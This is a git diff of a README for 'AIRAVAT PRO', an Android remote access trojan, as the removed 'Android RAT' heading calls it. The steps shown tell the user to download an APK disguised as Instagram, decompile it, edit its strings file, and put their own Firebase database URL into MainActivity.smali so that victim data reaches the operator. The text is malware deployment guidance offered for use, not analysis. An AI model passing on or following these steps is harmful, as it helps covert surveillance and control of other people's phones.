@@ -1,15 +1,16 @@
 ## AIRAVAT PRO
 
-Don't forget to add firebase url in ```smali_classes3/sigma/male/MainActivity.smali``` search for ```databaseURL``` and change it to your database url
+### Video
+
+---
+
+ [*] Don't forget to add firebase url in ```smali_classes3/sigma/male/MainActivity.smali``` search for ```databaseURL``` and change it to your database url
   </div>
   <div class="column">
     <img src="https://github.com/alvinbaby/AIRAVAT-PRO/blob/main/Img/4.jpg" alt="AIRAVAT-PRO" style="width:50%"> <img src="https://github.com/alvinbaby/AIRAVAT-PRO/blob/main/Img/5.jpg" alt="AIRAVAT-PRO" style="width:50%">
   </div>
 
-## Video 
-
-
-### Android RAT
+ 
  1. Download [Instagram.apk](./ANDROID%20APP/AndroidApp.apk)
  1. Decompile it using any Decompiler recommend above.
  1. Now open `res/values/strings.xml` file.
